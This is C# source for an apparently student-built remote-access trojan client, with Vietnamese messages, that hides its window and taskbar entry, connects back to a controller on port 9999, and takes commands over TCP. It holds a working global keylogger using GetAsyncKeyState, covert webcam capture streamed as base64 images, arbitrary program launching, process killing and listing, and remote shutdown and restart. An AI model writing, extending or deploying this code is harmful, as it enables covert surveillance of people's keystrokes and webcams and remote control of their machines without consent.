using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using AForge.Video;
using AForge.Video.DirectShow;
using System.Collections.Generic;

namespace TargetApp
{
    public partial class Form1 : Form
    {
        const string HOST_IP = "127.0.0.1"; 
        const int HOST_PORT = 9999;

        TcpClient client;
        NetworkStream stream;

        [DllImport("User32.dll")] public static extern int GetAsyncKeyState(Int32 i);
        System.Windows.Forms.Timer keylogTimer = new System.Windows.Forms.Timer();
        StringBuilder keyLogBuffer = new StringBuilder();

        FilterInfoCollection videoDevices;
        VideoCaptureDevice videoSource;
        string lastWebcamFrame = "";
        PictureBox pbCamLocal = new PictureBox();
        long lastFrameTime = 0;

        public Form1()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;

             this.ShowInTaskbar = false;
             this.Opacity = 0;

            this.Text = "CLIENT BOT - POWER CONTROL";
            this.Load += Form1_Load;
            this.FormClosing += Form1_FormClosing;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            pbCamLocal.Size = new Size(640, 480);
            this.Controls.Add(pbCamLocal);

            Thread t = new Thread(ConnectLoop);
            t.IsBackground = true;
            t.Start();

            keylogTimer.Interval = 10;
            keylogTimer.Tick += KeylogTimer_Tick;
            keylogTimer.Start();
        }

        void ConnectLoop()
        {
            while (true)
            {
                try
                {
                    client = new TcpClient();
                    client.Connect(HOST_IP, HOST_PORT);
                    stream = client.GetStream();

                    byte[] buffer = new byte[1024 * 5000];
                    while (client.Connected)
                    {
                        int bytesRead = stream.Read(buffer, 0, buffer.Length);
                        if (bytesRead > 0)
                        {
                            string cmd = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                            string result = ProcessCommand(cmd);

                            if (!string.IsNullOrEmpty(result))
                            {
                                byte[] resBytes = Encoding.UTF8.GetBytes(result);
                                stream.Write(resBytes, 0, resBytes.Length);
                            }
                        }
                    }
                }
                catch { Thread.Sleep(2000); }
            }
        }

        string ProcessCommand(string cmd)
        {
            if (cmd.Contains("WEBCAM_GET")) return string.IsNullOrEmpty(lastWebcamFrame) ? "NO_IMAGE" : lastWebcamFrame;

            string[] parts = cmd.Split('|');
            string action = parts[0];
            string param = parts.Length > 1 ? parts[1] : "";

            switch (action)
            {
                case "WEBCAM_ON": StartWebcam(); return "OK: Cam On";
                case "WEBCAM_OFF": StopWebcam(); return "OK: Cam Off";

                case "START":
                    try
                    {
                        Process.Start(param);
                        return "OK: Đã mở thành công '" + param + "'";
                    }
                    catch (Exception ex)
                    {
                        return "Lỗi: Không thể mở '" + param + "'. Chi tiết: " + ex.Message;
                    }

                case "STOP":
                    try
                    {
                        if (int.TryParse(param, out int pid))
                        {
                            try
                            {
                                Process p = Process.GetProcessById(pid);
                                p.Kill();
                                return "OK: Đã diệt PID " + pid;
                            }
                            catch (Exception ex)
                            {
                                return "Lỗi: Không thể tắt PID " + pid + ". Chi tiết: " + ex.Message;
                            }
                        }
                        else
                        {
                            string name = param.ToLower().Replace(".exe", "").Trim();
                            Process[] procs = Process.GetProcessesByName(name);

                            if (procs.Length == 0)
                            {
                                List<Process> found = new List<Process>();
                                foreach (var p in Process.GetProcesses())
                                    if (p.ProcessName.ToLower().Contains(name)) found.Add(p);
                                procs = found.ToArray();
                            }

                            if (procs.Length == 0) return "Lỗi: Không tìm thấy phần mềm nào tên là '" + param + "'";

                            int count = 0;
                            foreach (var p in procs)
                            {
                                try { p.Kill(); count++; } catch { }
                            }

                            if (count > 0) return "OK: Đã diệt " + count + " tiến trình tên '" + param + "'";
                            else return "Lỗi: Tìm thấy '" + param + "' nhưng không thể tắt được (Access Denied).";
                        }
                    }
                    catch (Exception ex) { return "Lỗi hệ thống khi tắt: " + ex.Message; }

                case "LIST": return GetProcs();

                case "KEYLOG": string k = keyLogBuffer.ToString(); keyLogBuffer.Clear(); return k;

                
                case "SHUTDOWN":
                    try
                    {
                        Process.Start("shutdown", "/s /t 0");
                        return "OK: Máy tính sẽ tắt ngay lập tức.";
                    }
                    catch (Exception ex)
                    {
                        return "Lỗi: Không thể tắt máy. Chi tiết: " + ex.Message;
                    }

                
                case "RESTART":
                    try
                    {
                        Process.Start("shutdown", "/r /t 0"); 
                        return "OK: Máy tính sẽ khởi động lại ngay lập tức.";
                    }
                    catch (Exception ex)
                    {
                        return "Lỗi: Không thể khởi động lại. Chi tiết: " + ex.Message;
                    }


                default: return "Unknown Cmd";
            }
        }

        string GetProcs()
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                foreach (Process p in Process.GetProcesses())
                    sb.AppendLine("PID: " + p.Id + " - Name: " + p.ProcessName);
                return sb.ToString();
            }
            catch { return "Err"; }
        }

        void StartWebcam()
        {
            try
            {
                if (videoSource != null && videoSource.IsRunning) return;
                videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                if (videoDevices.Count == 0) return;
                videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);

                VideoCapabilities bestConfig = null;
                foreach (VideoCapabilities cap in videoSource.VideoCapabilities)
                {
                    if (bestConfig == null) bestConfig = cap;
                    else if (cap.AverageFrameRate > bestConfig.AverageFrameRate) bestConfig = cap;
                }
                if (bestConfig != null) videoSource.VideoResolution = bestConfig;

                videoSource.NewFrame += VideoSource_NewFrame;
                videoSource.Start();
                this.Invoke((MethodInvoker)delegate { pbCamLocal.Visible = true; });
            }
            catch { }
        }

        void StopWebcam()
        {
            if (videoSource != null) videoSource.SignalToStop();
            this.Invoke((MethodInvoker)delegate { pbCamLocal.Image = null; });
        }

        private void VideoSource_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            try
            {
                long now = DateTime.Now.Ticks / TimeSpan.TicksPerMillisecond;
                if (now - lastFrameTime < 40) return;
                lastFrameTime = now;

                Bitmap frame = (Bitmap)eventArgs.Frame.Clone();
                using (Bitmap resized = new Bitmap(frame, new Size(640, 480)))
                {
                    using (MemoryStream ms = new MemoryStream())
                    {
                        resized.Save(ms, ImageFormat.Jpeg);
                        lastWebcamFrame = Convert.ToBase64String(ms.ToArray());
                    }
                }
                this.Invoke((MethodInvoker)delegate {
                    if (pbCamLocal.Image != null)
                    {
                        var old = pbCamLocal.Image;
                        pbCamLocal.Image = null;
                        old.Dispose();
                    }
                    pbCamLocal.Image = (Bitmap)frame.Clone();
                });
                frame.Dispose();
            }
            catch { }
        }

        private void KeylogTimer_Tick(object sender, EventArgs e)
        {
            for (int i = 0; i < 255; i++) if (GetAsyncKeyState(i) == -32767) keyLogBuffer.Append(((Keys)i).ToString() + " ");
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            StopWebcam();
            try { client.Close(); } catch { }
        }
    }
}